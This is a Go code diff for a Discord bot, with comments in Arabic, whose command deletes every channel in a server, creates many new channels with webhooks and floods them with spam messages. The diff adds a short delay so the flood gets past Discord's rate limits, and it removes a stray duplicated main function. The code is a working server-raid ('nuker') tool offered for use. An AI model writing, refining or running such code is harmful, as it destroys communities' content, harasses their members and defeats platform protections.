@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/signal"
 	"syscall"
+	"time"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -88,7 +89,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري الإطلاق الفوري الصاروخي...",
+					Content: "🚀 جاري الإطلاق الفوري وحذف الرومات وإنشاء السبام...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -108,7 +109,7 @@ func main() {
 
 			guildID := i.GuildID
 
-			// تنفيذ العمليات بشكل متزامن وعنيف جداً
+			// تنفيذ العمليات بشكل متزامن
 			go executeDestruction(token, guildID, roomName, roomsCount, webhookName, messageContent, messagesCount)
 		}
 	})
@@ -135,14 +136,14 @@ func main() {
 	sess.Close()
 }
 
-// دالة التنفيذ الشاملة لكل عمليات التدمير بالتوازي الحقيقي
+// دالة التنفيذ الشاملة
 func executeDestruction(token, guildID, roomName string, roomsCount int, webhookName, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
 	}
 
-	// 1. جلب وحذف جميع الرومات دفعة واحدة
+	// 1. جلب وحذف جميع الرومات الموجودة في السيرفر تلقائياً وبأقصى سرعة
 	go func() {
 		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 		for k, v := range headers {
@@ -200,7 +201,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 		}
 	}()
 
-	// 3. إنشاء الرومات والويب هوكات والسبام بشكل متزامن فوري
+	// 3. إنشاء الرومات الجديدة، ووضع الويب هوك، وإرسال العدد كاملاً من الرسائل بدقة
 	for i := 0; i < roomsCount; i++ {
 		go func() {
 			// إنشاء الروم
@@ -225,7 +226,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 				return
 			}
 
-			// إنشاء الويب هوك
+			// إنشاء الويب هوك داخل الروم الجديد
 			whPayload, _ := json.Marshal(map[string]string{"name": webhookName})
 			whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chID+"/webhooks", bytes.NewBuffer(whPayload))
 			for k, v := range headers {
@@ -248,7 +249,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 
 			whURL := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tok)
 
-			// إرسال الرسائل للويب هوك دفعة واحدة وبأقصى سرعة
+			// إرسال رسائل الويب هوك بالعدد المطلوب كاملاً (مع فاصل زمن صغير جداً لمنع الـ Rate Limit وضمان وصولها كلها)
 			for m := 0; m < messagesCount; m++ {
 				go func(url string) {
 					msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
@@ -256,24 +257,10 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 					msgReq.Header.Set("Content-Type", "application/json")
 					client.Do(msgReq)
 				}(whURL)
+				
+				// فاصل زمني بسيط بالمللي ثانية لضمان عدم حظر الويب هوك من ديسكورد ووصول العدد كاملاً
+				time.Sleep(50 * time.Millisecond)
 			}
 		}()
 	}
-}
-package main
-
-import (
-    "os"
-    "os/signal"
-    "syscall"
-    // باقي المكتبات حقك...
-)
-
-func main() {
-    // كود تشغيل البوت وتسجيل الدخول هنا...
-
-    // 🛑 هذا الكود هو اللي يخلي البوت شغال وما يطفى
-    sc := make(chan os.Signal, 1)
-    signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
-    <-sc
 }
